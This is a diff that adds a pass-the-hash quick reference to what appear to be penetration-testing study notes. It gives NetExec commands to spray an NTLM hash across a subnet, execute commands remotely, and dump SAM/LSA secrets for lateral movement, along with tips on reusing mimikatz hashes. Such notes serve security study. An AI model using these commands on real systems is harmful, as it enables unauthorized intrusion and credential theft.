@@ -97,3 +97,35 @@ PS> Enter-PSSession DC_NAME
 
 > [!Note]
 > In this case the hash we have compromised is from a domain admin user so we can remotely access the DC
+
+---
+
+# Quick reference — PtH with NetExec / CrackMapExec
+
+Once you have a valid NTLM hash, the fastest way to spray it across a subnet and confirm where it grants local admin is `nxc` (NetExec, the maintained successor of CrackMapExec). The `(Pwn3d!)` marker means local admin → RCE is possible:
+
+```bash
+# Validate the hash and find where it is local admin (spray across a CIDR)
+$ nxc smb 10.10.10.0/24 -u Administrator -H NTLM_HASH
+$ nxc smb TARGET_IP -u Administrator -H NTLM_HASH        # look for (Pwn3d!)
+
+# Execute a command once you see (Pwn3d!)
+$ nxc smb TARGET_IP -u Administrator -H NTLM_HASH -x "whoami /all"
+
+# Dump the local SAM / LSA secrets to harvest more hashes for lateral movement
+$ nxc smb TARGET_IP -u Administrator -H NTLM_HASH --sam --lsa
+```
+
+> [!Tip]
+> When only the NT half of an LM:NT pair is known, pass it as `-hashes :NTLM_HASH` (Impacket) or `-H NTLM_HASH` (nxc) — the leading colon means "empty LM hash". The hashes dumped by mimikatz here can be reused directly against other hosts or fed into [[Kerberoasting]] / offline cracking (see [[Linux Dumping and Cracking Credentials]]).
+
+---
+
+### Related notes
+- [[WinRM]] — alternative remote access (Evil-WinRM also accepts `-H NTLM_HASH`)
+- [[Pass the Ticket (PtT)]] — the Kerberos-ticket analogue of PtH
+- [[Kerberoasting]] / [[AS-REP Roasting]] — harvesting crackable Kerberos hashes
+- [[AD Enumeration with PowerView]] — `Find-LocalAdminAccess` and general enumeration used above
+- [[AD Automatic Enumeration (BloodHound)]] — map which hosts an owned account can reach
+- [[AD Enumeration - Credentialed - From Linux]] — running the same PtH flow entirely from Linux
+- [[Silver Ticket]] — forging service tickets once a service account hash is known
